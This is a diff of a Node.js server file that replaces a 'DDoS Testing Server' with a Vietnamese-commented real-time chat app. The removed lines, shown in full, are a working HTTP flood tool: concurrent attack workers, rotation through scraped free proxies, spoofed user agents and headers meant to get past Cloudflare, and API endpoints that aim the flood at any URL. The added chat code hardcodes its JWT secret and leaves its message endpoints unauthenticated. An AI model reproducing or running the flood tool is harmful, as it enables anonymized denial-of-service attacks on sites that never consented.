@@ -1,463 +1,226 @@
 const express = require('express');
-const axios = require('axios');
+const http = require('http');
+const socketIo = require('socket.io');
+const bcrypt = require('bcryptjs');
+const jwt = require('jsonwebtoken');
 const cors = require('cors');
-const { Worker } = require('worker_threads');
-const app = express();
-const PORT = process.env.PORT || 4000;
+const path = require('path');
 
+const app = express();
+const server = http.createServer(app);
+const io = socketIo(server, {
+  cors: {
+    origin: "*",
+    methods: ["GET", "POST"]
+  }
+});
+
+// Middleware
 app.use(cors());
 app.use(express.json());
+app.use(express.static('public'));
 
-// Attack Statistics
-let attackStats = {
-  totalRequests: 0,
-  successfulRequests: 0,
-  failedRequests: 0,
-  activeWorkers: 0,
-  startTime: null,
-  isRunning: false,
-  target: null,
-  requestsPerSecond: 0
-};
+// In-memory database (thay bằng MongoDB trong production)
+const users = [];
+const messages = [];
+const onlineUsers = new Map();
 
-// Free Proxy Lists
-const freeProxyAPIs = [
-  'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
-  'https://www.proxy-list.download/api/v1/get?type=http',
-  'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
-  'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
-  'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt'
-];
+// Secret key cho JWT
+const JWT_SECRET = 'your-secret-key-change-this';
 
-// Proxy Pool
-let proxyPool = [];
-let lastProxyFetch = 0;
-
-// Fetch fresh proxies
-async function fetchProxies() {
-  console.log('🔄 Fetching fresh proxies...');
-  const now = Date.now();
-  
-  // Cache proxies for 5 minutes
-  if (proxyPool.length > 0 && now - lastProxyFetch < 300000) {
-    return proxyPool;
-  }
-
-  let allProxies = [];
-
-  for (const api of freeProxyAPIs) {
-    try {
-      const response = await axios.get(api, { timeout: 5000 });
-      const proxies = response.data
-        .split('\n')
-        .filter(line => line.trim() && line.includes(':'))
-        .map(line => line.trim());
-      
-      allProxies.push(...proxies);
-      console.log(`✅ Fetched ${proxies.length} proxies from ${api}`);
-    } catch (error) {
-      console.log(`❌ Failed to fetch from ${api}`);
-    }
-  }
-
-  // Remove duplicates
-  proxyPool = [...new Set(allProxies)];
-  lastProxyFetch = now;
-  
-  console.log(`✅ Total proxies in pool: ${proxyPool.length}`);
-  return proxyPool;
-}
-
-// Get random proxy
-function getRandomProxy() {
-  if (proxyPool.length === 0) return null;
-  return proxyPool[Math.floor(Math.random() * proxyPool.length)];
-}
-
-// Random User Agents
-const userAgents = [
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
-  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
-  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
-  'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
-  'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-];
-
-function getRandomUserAgent() {
-  return userAgents[Math.floor(Math.random() * userAgents.length)];
-}
-
-// Generate random headers to bypass Cloudflare
-function generateHeaders() {
-  return {
-    'User-Agent': getRandomUserAgent(),
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-    'Accept-Language': 'en-US,en;q=0.5',
-    'Accept-Encoding': 'gzip, deflate, br',
-    'DNT': '1',
-    'Connection': 'keep-alive',
-    'Upgrade-Insecure-Requests': '1',
-    'Sec-Fetch-Dest': 'document',
-    'Sec-Fetch-Mode': 'navigate',
-    'Sec-Fetch-Site': 'none',
-    'Cache-Control': 'max-age=0',
-    'Referer': 'https://www.google.com/',
-  };
-}
-
-// Single attack request
-async function sendAttackRequest(target, method = 'GET', data = null, useProxy = true) {
+// API: Đăng ký tài khoản
+app.post('/api/register', async (req, res) => {
   try {
-    const config = {
-      method: method,
-      url: target,
-      headers: generateHeaders(),
-      timeout: 10000,
-      validateStatus: () => true, // Accept any status
+    const { username, email, password, avatar } = req.body;
+
+    // Kiểm tra user đã tồn tại
+    const existingUser = users.find(u => u.email === email || u.username === username);
+    if (existingUser) {
+      return res.status(400).json({ error: 'Username hoặc email đã tồn tại' });
+    }
+
+    // Hash password
+    const hashedPassword = await bcrypt.hash(password, 10);
+
+    // Tạo user mới
+    const newUser = {
+      id: Date.now().toString(),
+      username,
+      email,
+      password: hashedPassword,
+      avatar: avatar || `https://ui-avatars.com/api/?name=${username}&background=random`,
+      createdAt: new Date()
     };
 
-    // Add data for POST requests
-    if (method === 'POST' && data) {
-      config.data = data;
-      config.headers['Content-Type'] = 'application/json';
-    }
+    users.push(newUser);
 
-    // Add proxy if enabled
-    if (useProxy) {
-      const proxy = getRandomProxy();
-      if (proxy) {
-        const [host, port] = proxy.split(':');
-        config.proxy = {
-          host: host,
-          port: parseInt(port)
-        };
-      }
-    }
-
-    const response = await axios(config);
-    
-    attackStats.totalRequests++;
-    if (response.status < 500) {
-      attackStats.successfulRequests++;
-    } else {
-      attackStats.failedRequests++;
-    }
-
-    return {
-      success: true,
-      status: response.status,
-      size: response.data?.length || 0
-    };
-
-  } catch (error) {
-    attackStats.totalRequests++;
-    attackStats.failedRequests++;
-    
-    return {
-      success: false,
-      error: error.message
-    };
-  }
-}
-
-// Attack worker
-class AttackWorker {
-  constructor(id, target, config) {
-    this.id = id;
-    this.target = target;
-    this.config = config;
-    this.isRunning = false;
-    this.requestCount = 0;
-  }
-
-  async start() {
-    this.isRunning = true;
-    attackStats.activeWorkers++;
-
-    while (this.isRunning) {
-      await sendAttackRequest(
-        this.target,
-        this.config.method,
-        this.config.data,
-        this.config.useProxy
-      );
-      
-      this.requestCount++;
-
-      // Small delay to prevent blocking
-      if (this.config.delay > 0) {
-        await new Promise(resolve => setTimeout(resolve, this.config.delay));
-      }
-    }
-
-    attackStats.activeWorkers--;
-  }
-
-  stop() {
-    this.isRunning = false;
-  }
-}
-
-// Attack Manager
-class AttackManager {
-  constructor() {
-    this.workers = [];
-    this.statsInterval = null;
-  }
-
-  async startAttack(target, config) {
-    if (attackStats.isRunning) {
-      throw new Error('Attack already running');
-    }
-
-    // Fetch proxies first
-    if (config.useProxy) {
-      await fetchProxies();
-      if (proxyPool.length === 0) {
-        throw new Error('No proxies available');
-      }
-    }
-
-    // Reset stats
-    attackStats = {
-      totalRequests: 0,
-      successfulRequests: 0,
-      failedRequests: 0,
-      activeWorkers: 0,
-      startTime: Date.now(),
-      isRunning: true,
-      target: target,
-      requestsPerSecond: 0
-    };
-
-    // Start workers
-    for (let i = 0; i < config.workers; i++) {
-      const worker = new AttackWorker(i, target, config);
-      this.workers.push(worker);
-      worker.start(); // Non-blocking
-    }
-
-    // Start stats updater
-    this.startStatsUpdater();
-
-    console.log(`🚀 Attack started: ${config.workers} workers → ${target}`);
-  }
-
-  stopAttack() {
-    this.workers.forEach(worker => worker.stop());
-    this.workers = [];
-    attackStats.isRunning = false;
-
-    if (this.statsInterval) {
-      clearInterval(this.statsInterval);
-      this.statsInterval = null;
-    }
-
-    console.log('🛑 Attack stopped');
-  }
-
-  startStatsUpdater() {
-    let lastCount = 0;
-    
-    this.statsInterval = setInterval(() => {
-      const currentCount = attackStats.totalRequests;
-      attackStats.requestsPerSecond = currentCount - lastCount;
-      lastCount = currentCount;
-    }, 1000);
-  }
-
-  getStats() {
-    return {
-      ...attackStats,
-      duration: attackStats.startTime 
-        ? Math.floor((Date.now() - attackStats.startTime) / 1000)
-        : 0,
-      successRate: attackStats.totalRequests > 0
-        ? Math.round((attackStats.successfulRequests / attackStats.totalRequests) * 100)
-        : 0
-    };
-  }
-}
-
-const attackManager = new AttackManager();
-
-// API Endpoints
-
-// Start attack
-app.post('/api/attack/start', async (req, res) => {
-  try {
-    const {
-      target,
-      workers = 10,
-      method = 'GET',
-      data = null,
-      useProxy = true,
-      delay = 0
-    } = req.body;
-
-    if (!target) {
-      return res.status(400).json({
-        success: false,
-        error: 'Target URL is required'
-      });
-    }
-
-    // Validate URL
-    try {
-      new URL(target);
-    } catch (e) {
-      return res.status(400).json({
-        success: false,
-        error: 'Invalid target URL'
-      });
-    }
-
-    await attackManager.startAttack(target, {
-      workers,
-      method,
-      data,
-      useProxy,
-      delay
-    });
+    // Tạo token
+    const token = jwt.sign({ id: newUser.id }, JWT_SECRET, { expiresIn: '7d' });
 
     res.json({
       success: true,
-      message: 'Attack started',
-      config: {
-        target,
-        workers,
-        method,
-        useProxy,
-        delay
+      token,
+      user: {
+        id: newUser.id,
+        username: newUser.username,
+        email: newUser.email,
+        avatar: newUser.avatar
       }
     });
-
   } catch (error) {
-    res.status(500).json({
-      success: false,
-      error: error.message
-    });
+    res.status(500).json({ error: 'Lỗi server' });
   }
 });
 
-// Stop attack
-app.post('/api/attack/stop', (req, res) => {
-  attackManager.stopAttack();
-  
-  res.json({
-    success: true,
-    message: 'Attack stopped',
-    finalStats: attackManager.getStats()
-  });
-});
-
-// Get stats
-app.get('/api/stats', (req, res) => {
-  res.json({
-    success: true,
-    stats: attackManager.getStats(),
-    proxyCount: proxyPool.length
-  });
-});
-
-// Fetch proxies manually
-app.post('/api/proxies/refresh', async (req, res) => {
+// API: Đăng nhập
+app.post('/api/login', async (req, res) => {
   try {
-    await fetchProxies();
+    const { email, password } = req.body;
+
+    // Tìm user
+    const user = users.find(u => u.email === email);
+    if (!user) {
+      return res.status(400).json({ error: 'Email hoặc password không đúng' });
+    }
+
+    // Kiểm tra password
+    const isValid = await bcrypt.compare(password, user.password);
+    if (!isValid) {
+      return res.status(400).json({ error: 'Email hoặc password không đúng' });
+    }
+
+    // Tạo token
+    const token = jwt.sign({ id: user.id }, JWT_SECRET, { expiresIn: '7d' });
+
     res.json({
       success: true,
-      proxyCount: proxyPool.length
+      token,
+      user: {
+        id: user.id,
+        username: user.username,
+        email: user.email,
+        avatar: user.avatar
+      }
     });
   } catch (error) {
-    res.status(500).json({
-      success: false,
-      error: error.message
-    });
+    res.status(500).json({ error: 'Lỗi server' });
   }
 });
 
-// Test single request
-app.post('/api/test', async (req, res) => {
-  try {
-    const { target, useProxy = false } = req.body;
+// API: Lấy danh sách users
+app.get('/api/users', (req, res) => {
+  const userList = users.map(u => ({
+    id: u.id,
+    username: u.username,
+    avatar: u.avatar,
+    online: onlineUsers.has(u.id)
+  }));
+  res.json(userList);
+});
 
-    if (!target) {
-      return res.status(400).json({
-        success: false,
-        error: 'Target URL is required'
+// API: Lấy tin nhắn giữa 2 users
+app.get('/api/messages/:userId1/:userId2', (req, res) => {
+  const { userId1, userId2 } = req.params;
+  const conversation = messages.filter(m => 
+    (m.from === userId1 && m.to === userId2) || 
+    (m.from === userId2 && m.to === userId1)
+  );
+  res.json(conversation);
+});
+
+// Socket.io cho real-time chat
+io.on('connection', (socket) => {
+  console.log('User connected:', socket.id);
+
+  // User đăng nhập
+  socket.on('user-online', (userId) => {
+    onlineUsers.set(userId, socket.id);
+    io.emit('user-status-change', { userId, online: true });
+  });
+
+  // Gửi tin nhắn
+  socket.on('send-message', (data) => {
+    const message = {
+      id: Date.now().toString(),
+      from: data.from,
+      to: data.to,
+      text: data.text,
+      timestamp: new Date()
+    };
+    
+    messages.push(message);
+    
+    // Gửi cho người nhận
+    const recipientSocketId = onlineUsers.get(data.to);
+    if (recipientSocketId) {
+      io.to(recipientSocketId).emit('receive-message', message);
+    }
+    
+    // Confirm cho người gửi
+    socket.emit('message-sent', message);
+  });
+
+  // User typing
+  socket.on('typing', (data) => {
+    const recipientSocketId = onlineUsers.get(data.to);
+    if (recipientSocketId) {
+      io.to(recipientSocketId).emit('user-typing', data.from);
+    }
+  });
+
+  socket.on('stop-typing', (data) => {
+    const recipientSocketId = onlineUsers.get(data.to);
+    if (recipientSocketId) {
+      io.to(recipientSocketId).emit('user-stop-typing', data.from);
+    }
+  });
+
+  // Video call signaling
+  socket.on('call-user', (data) => {
+    const recipientSocketId = onlineUsers.get(data.to);
+    if (recipientSocketId) {
+      io.to(recipientSocketId).emit('incoming-call', {
+        from: data.from,
+        offer: data.offer
       });
     }
-
-    const result = await sendAttackRequest(target, 'GET', null, useProxy);
-
-    res.json({
-      success: true,
-      result
-    });
-
-  } catch (error) {
-    res.status(500).json({
-      success: false,
-      error: error.message
-    });
-  }
-});
-
-// Health check
-app.get('/health', (req, res) => {
-  res.json({
-    status: 'ok',
-    message: 'DDoS Testing Server',
-    version: '1.0',
-    timestamp: new Date().toISOString()
   });
-});
 
-app.get('/', (req, res) => {
-  res.json({
-    name: 'DDoS Testing Server',
-    version: '1.0',
-    warning: '⚠️ USE ONLY ON YOUR OWN SERVERS! Attacking others is illegal!',
-    endpoints: {
-      'POST /api/attack/start': 'Start attack',
-      'POST /api/attack/stop': 'Stop attack',
-      'GET /api/stats': 'Get attack statistics',
-      'POST /api/proxies/refresh': 'Refresh proxy list',
-      'POST /api/test': 'Test single request',
-      'GET /health': 'Health check'
+  socket.on('accept-call', (data) => {
+    const callerSocketId = onlineUsers.get(data.to);
+    if (callerSocketId) {
+      io.to(callerSocketId).emit('call-accepted', {
+        from: data.from,
+        answer: data.answer
+      });
     }
   });
+
+  socket.on('ice-candidate', (data) => {
+    const recipientSocketId = onlineUsers.get(data.to);
+    if (recipientSocketId) {
+      io.to(recipientSocketId).emit('ice-candidate', {
+        from: data.from,
+        candidate: data.candidate
+      });
+    }
+  });
+
+  // Disconnect
+  socket.on('disconnect', () => {
+    // Tìm và xóa user khỏi danh sách online
+    for (let [userId, socketId] of onlineUsers.entries()) {
+      if (socketId === socket.id) {
+        onlineUsers.delete(userId);
+        io.emit('user-status-change', { userId, online: false });
+        break;
+      }
+    }
+    console.log('User disconnected:', socket.id);
+  });
 });
 
-// Start server
-app.listen(PORT, () => {
-  console.log(`
-╔════════════════════════════════════════════╗
-║     ⚡ DDoS TESTING SERVER v1.0 ⚡         ║
-╚════════════════════════════════════════════╝
-
-🚀 Server: http://localhost:${PORT}
-⚠️  WARNING: Use only on YOUR OWN servers!
-
-Features:
-  ✅ Multiple bot workers
-  ✅ Free proxy rotation
-  ✅ Cloudflare bypass attempts
-  ✅ Real-time statistics
-  ✅ Custom headers & user agents
-
-Ready to test! 💥
-  `);
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, () => {
+  console.log(`Server đang chạy tại http://localhost:${PORT}`);
 });
-
-// Cleanup on exit
-process.on('SIGTERM', () => {
-  attackManager.stopAttack();
-  console.log('Server shutting down...');
-  process.exit(0);
-});
-
-module.exports = app;
